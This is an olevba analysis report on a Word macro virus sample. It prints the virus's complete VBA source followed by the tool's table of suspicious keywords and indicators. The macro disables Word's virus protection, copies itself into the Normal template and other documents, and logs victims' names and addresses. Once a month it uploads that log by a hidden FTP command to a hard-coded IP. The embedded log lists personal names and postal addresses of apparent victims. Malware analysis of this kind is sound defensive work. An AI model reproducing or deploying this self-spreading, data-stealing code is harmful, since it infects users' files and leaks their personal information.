olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-c0ee32a1d7a04db365ddb2f6d7523d2a925bada2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-c0ee32a1d7a04db365ddb2f6d7523d2a925bada2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is another marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogUploaded As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    Randomize
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsfx" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = True
  ElseIf Day(Now()) <> 1 Then
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = False
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 10:19:17  - Freitag, 11 Dez 1998
' SPo0Ky
' Blue Planet
'




' 04:11:53  - zondag, 17 jan 1999
' Netelenbos
'



' 11:45:53  - woensdag, 20 jan 1999
' JC.Netelenbos
'



' 03:30:46  - dinsdag, 9 mrt 1999
' JC.Netelenbos
'



' 10:20:44  - donderdag, 25 mrt 1999
' N.Bravenboer
' Department of Endocrinology
' Academic Hospital, Vrije Universiteit
' PO box 7057
' 1007 MB Amsterdam
' Netherlands



' 02:00:24  - woensdag, 31 mrt 1999
' AMJJ Verweij
'



' 04:17:42 PM - Friday, 7 May 1999
' Fac. Geneeskunde
'



' 10:58:43  - donderdag, 10 jun 1999
' IFMSA VU
' v.d. Boechorstraat 7
' kamer BK 46
' 1081 BT Amsterdam
' the Netherlands



' 10:44:19  - maandag, 5 jul 1999
' Elske Hoornenborg
'



' 01:29:39 PM - Monday, 23 Aug 1999
' ioana
'



' 09:59:29 PM - Sunday, 17 Oct 1999
' secretar
'



' 10:09:32 PM - Tuesday, 2 Nov 1999
' Pop Iustin & Floris
'



' 09:57:52 AM - Saturday, 30 May 1998
' Pop IUSTIN & FLORIS
'



' 12:44:51  - vendredi, 11 févr 2000
' BURLAN  DANA
'



' 08:08:29  - samedi, 12 févr 2000
' UBB
'



' 06:10:07  - lundi, 28 févr 2000
' UBB
' MATROS IOANA
' STR.DONATH
' AP 36
' CLUJ NAPOCA



' 05:37:00  - miercuri, 1 Mar 2000
' UBB
'



' 06:53:40 PM - Thursday, 18 May 2000
' Sergiucu
'



' 10:13:12 PM - Tuesday, 11 Jul 2000
' Sergiucu
'



' 12:23:04 PM - Saturday, 26 Aug 2000
' Birou Plan
'



' 10:34:11  - marţi, 31 Oct 2000
' jhgj
'



' 12:55:51  - marţi, 23 Ian 2001
' jhgj
'



' 03:10:15 PM - Monday, 30 Jul 2001
' aa
'



' 08:28:23 AM - Thursday, 21 Feb 2002
' Productie_2
'



' 08:00:11 PM - Friday, 15 Mar 2002
' PC
'



' 10:00:44  - luni, 18 Mar 2002
' student
'



' 06:37:29  - luni, 18 Mar 2002
' PC
'



' 12:44:02  - ńóááîňŕ, 26 îęň 2002
' student
'



' 09:16:34  - ďîíĺäĺëüíčę, 17 ěŕđ 2003
' student
'



' 06:08:41 PM - Wednesday, 28 May 2003
' broskutza
'



' 12:36:19 PM - Thursday, 29 May 2003
' broskutza
'



' 12:44:27  - joi, 5 Iun 2003
' User
'



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

